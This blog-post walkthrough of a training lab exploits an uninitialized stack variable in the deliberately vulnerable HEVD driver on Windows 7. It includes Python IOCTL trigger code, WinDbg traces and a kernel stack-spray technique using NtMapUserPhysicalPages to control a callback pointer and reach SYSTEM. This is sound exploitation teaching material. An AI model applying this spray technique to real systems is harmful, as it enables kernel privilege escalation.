---
layout:     post
title:      HackSysExtremeVulnerableDriver UninitializedStackVariable
author:     wooy0ung
tags:       hevd
category:   exploit
---

- 目录
{:toc #markdown-toc}

>[Analysis Environment]  
>guest machine: Windows 7 x86 sp0  
>host machine: Windows 10  
>necessary tools: VirtualKD[[here]](http://virtualkd.sysprogs.org/)、OSRloader[[here]](https://www.osronline.com/article.cfm?article=157)、HackSysExtremeVulnerableDriver[[here]](https://github.com/hacksysteam/HackSysExtremeVulnerableDriver)、Windbg  
<!-- more -->


## 0x001 Test POC

Let's work with the same steps like the last challenge.
```
import sys
from ctypes import *

kernel32 = windll.kernel32
psapi = windll.Psapi
ntdll = windll.ntdll

hevDevice = kernel32.CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver", 0xC0000000, 0, None, 0x3, 0, None)

if not hevDevice or hevDevice == -1:
   print "[-] Couldn't get Device Driver handle."
   sys.exit(0)

buf = "\xff\xff\xff\xff"

kernel32.DeviceIoControl(hevDevice, 0x22202F, buf, len(buf), None, 0, byref(c_ulong()), None)
```

Obviously, it triggers an exception, but it work fine.
```
****** HACKSYS_EVD_IOCTL_UNINITIALIZED_STACK_VARIABLE ******
[+] UserValue: 0xFFFFFFFF
[+] UninitializedStackVariable Address: 0x96535AC8
[+] UninitializedStackVariable.Value: 0x00000000
[+] UninitializedStackVariable.Callback: 0x00000400
[+] Triggering Uninitialized Stack Variable Vulnerability
[-] Exception Code: 0xC0000005
****** HACKSYS_EVD_IOCTL_UNINITIALIZED_STACK_VARIABLE ******
```


## 0x002 Exploit it!

Similarlly, if a UserValue not equal to 0xBAD0B0B0, there will call an Uninitialized Stack Variable
![](/assets/img/exploit/2018-08-06-hacksys-extreme-vulnerable-driver-uninitializedstackvariable/0x001.png)

Set a breakpoint at TriggerUninitializedStackVariable method
```
kd> bp HEVD!TriggerUninitializedStackVariable+0x94
kd> bl
     0 e Disable Clear  957c3f8e     0001 (0001) HEVD!TriggerUninitializedStackVariable+0x94

kd> g
****** HACKSYS_EVD_IOCTL_UNINITIALIZED_STACK_VARIABLE ******
[+] UserValue: 0xBAD31337
[+] UninitializedStackVariable Address: 0x8D78BAC8
[+] UninitializedStackVariable.Value: 0x87C37940
[+] UninitializedStackVariable.Callback: 0x00000400
[+] Triggering Uninitialized Stack Variable Vulnerability
Breakpoint 0 hit
HEVD!TriggerUninitializedStackVariable+0x94:
957c3f8e ff95f8feffff    call    dword ptr [ebp-108h]
kd> dps esp
8d78bab8  18048fee
8d78babc  9343b0b0
8d78bac0  9343b120
8d78bac4  957c4ca4 HEVD! ?? ::NNGAKEGL::`string'
8d78bac8  87c37940
8d78bacc  00000400
8d78bad0  00000000
8d78bad4  0017c36c
8d78bad8  0017c464
8d78badc  0017c36c
8d78bae0  8d78bb04
8d78bae4  8406b65c nt!PsChargeSharedPoolQuota+0x42
8d78bae8  0017f014
8d78baec  00000000
8d78baf0  05000000
8d78baf4  000000f8
```
I know the Addr of Callback is 0x8d78bacc with a value of 0x000004

Next step, find the Stack Init Addr(0x8d78bfd0 at this time)
```
kd> !thread
THREAD 87e59830  Cid 0a80.0a74  Teb: 7ffde000 Win32Thread: fd76c160 RUNNING on processor 0
IRP List:
    9343b0b0: (0006,0094) Flags: 00060000  Mdl: 00000000
Not impersonating
DeviceMap                 8bb47a60
Owning Process            85975030       Image:         python.exe
Attached Process          N/A            Image:         N/A
Wait Start TickCount      10277          Ticks: 0
Context Switch Count      24             IdealProcessor: 0             
UserTime                  00:00:00.000
KernelTime                00:00:00.046
Win32 Start Address 0x1c161327
Stack Init 8d78bfd0 Current 8d78b198 Base 8d78c000 Limit 8d789000 Call 00000000
Priority 9 BasePriority 8 PriorityDecrement 0 IoPriority 2 PagePriority 5
ChildEBP RetAddr  Args to Child              
8d78bbd4 957c3fe8 01ace154 8d78bbfc 957c4219 HEVD!TriggerUninitializedStackVariable+0x94 (FPO: [Non-Fpo]) (CONV: stdcall) [c:\hacksysextremevulnerabledriver\driver\uninitializedstackvariable.c @ 120] 
8d78bbe0 957c4219 9343b0b0 9343b120 93543c18 HEVD!UninitializedStackVariableIoctlHandler+0x1a (FPO: [Non-Fpo]) (CONV: stdcall) [c:\hacksysextremevulnerabledriver\driver\uninitializedstackvariable.c @ 151] 
8d78bbfc 83e854bc 934f4dd8 9343b0b0 9343b0b0 HEVD!IrpDeviceIoCtlHandler+0x18b (FPO: [Non-Fpo]) (CONV: stdcall) [c:\hacksysextremevulnerabledriver\driver\hacksysextremevulnerabledriver.c @ 285] 
8d78bc14 84086eee 93543c18 9343b0b0 9343b120 nt!IofCallDriver+0x63
8d78bc34 840a3cd1 934f4dd8 93543c18 00000000 nt!IopSynchronousServiceTail+0x1f8
8d78bcd0 840a64ac 934f4dd8 9343b0b0 00000000 nt!IopXxxControlFile+0x6aa
8d78bd04 83e8c42a 00000070 00000000 00000000 nt!NtDeviceIoControlFile+0x2a
8d78bd04 77ab64f4 00000070 00000000 00000000 nt!KiFastCallEntry+0x12a (FPO: [0,3] TrapFrame @ 8d78bd34)
002df740 77ab4cac 75e1a08f 00000070 00000000 ntdll!KiFastSystemCallRet (FPO: [0,0,0])
002df744 75e1a08f 00000070 00000000 00000000 ntdll!ZwDeviceIoControlFile+0xc (FPO: [10,0,0])
WARNING: Frame IP not in any known module. Following frames may be wrong.
002df7a4 7737ec25 00000070 0022202f 01ace154 0x75e1a08f
···
```

The distance between the Stack Init Addr and Callback variable is 0x504.

Now, I try to spray the kernel stack with a page size of "\x41"(1024*4) by calling NtMapUserPhysicalPages method
```
import sys
from ctypes import *

kernel32 = windll.kernel32
psapi = windll.Psapi
ntdll = windll.ntdll

hevDevice = kernel32.CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver", 0xC0000000, 0, None, 0x3, 0, None)

if not hevDevice or hevDevice == -1:
   print "[-] Couldn't get Device Driver handle."
   sys.exit(0)

ptr_adr = "\x41\x41\x41\x41" * 1024
ntdll.NtMapUserPhysicalPages(None,1024,ptr_adr)

buf = "\xff\xff\xff\xff"

kernel32.DeviceIoControl(hevDevice, 0x22202F, buf, len(buf), None, 0, byref(c_ulong()), None)
```

There is no doubt that our desired address contains our sprayed value.
```
****** HACKSYS_EVD_IOCTL_UNINITIALIZED_STACK_VARIABLE ******
[+] UserValue: 0xBAD31337
[+] UninitializedStackVariable Address: 0x96B6FAC8
[+] UninitializedStackVariable.Value: 0x41414141
[+] UninitializedStackVariable.Callback: 0x41414141
[+] Triggering Uninitialized Stack Variable Vulnerability
Breakpoint 0 hit
HEVD!TriggerUninitializedStackVariable+0x94:
957c3f8e ff95f8feffff    call    dword ptr [ebp-108h]
kd> dps esp
96b6fab8  03cacfee
96b6fabc  87dbf370
96b6fac0  87dbf3e0
96b6fac4  957c4ca4 HEVD! ?? ::NNGAKEGL::`string'
96b6fac8  41414141
96b6facc  41414141
96b6fad0  41414141
96b6fad4  41414141
96b6fad8  41414141
96b6fadc  41414141
96b6fae0  41414141
96b6fae4  41414141
96b6fae8  41414141
96b6faec  41414141
96b6faf0  41414141
96b6faf4  41414141
96b6faf8  41414141
96b6fafc  41414141
96b6fb00  41414141
96b6fb04  41414141
96b6fb08  41414141
96b6fb0c  41414141
96b6fb10  c0802000
96b6fb14  96b6fb40
96b6fb18  83ebd49c nt!MiUpdateWsle+0x231
96b6fb1c  6a2b6001
96b6fb20  0000081d
```

Finally, I will spray upto our shellcode Addr, and get a system cmd.
![](/assets/img/exploit/2018-08-06-hacksys-extreme-vulnerable-driver-uninitializedstackvariable/0x002.png)